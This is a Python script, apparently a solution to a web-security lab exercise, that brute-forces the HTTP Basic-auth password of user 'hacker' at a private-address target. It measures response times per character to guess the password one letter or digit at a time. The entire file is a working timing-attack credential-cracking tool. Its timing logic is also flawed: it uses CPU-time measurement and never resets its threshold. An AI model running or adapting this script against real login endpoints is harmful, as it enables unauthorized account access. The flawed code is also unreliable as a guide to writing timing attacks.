import requests
import time
import sys
from string import ascii_lowercase

def test():
    password = ''
    correct = 0
    newLetter = ''
    status = 0
    while 1:
        for x in ascii_lowercase:
            temp = password + x
            start = time.clock()
            r = requests.get('http://192.168.142.133/authentication/example2/', auth=('hacker', temp))
            elapsed = time.clock()
            elapsed = elapsed - start
            if(elapsed > correct):
                correct = elapsed
                newLetter = str(x)
                status = int(r.status_code)
                if status == 200:
                    password = password + newLetter
                    return password
            print(temp + ' -> ' + str(elapsed))
            status = r.status_code
        for x in range(0, 10):
            temp = password + str(x)
            start = time.clock()
            r = requests.get('http://192.168.142.133/authentication/example2/', auth=('hacker', temp))
            elapsed = time.clock()
            elapsed = elapsed - start
            if(elapsed > correct):
                correct = elapsed
                newLetter = str(x)
                status = int(r.status_code)
                if status == 200:
                    password = password + newLetter
                    return password
            print(temp + ' -> ' + str(elapsed))
        password = password + newLetter

if __name__ == '__main__':
    password = test()
    print('Password is : ' + password)
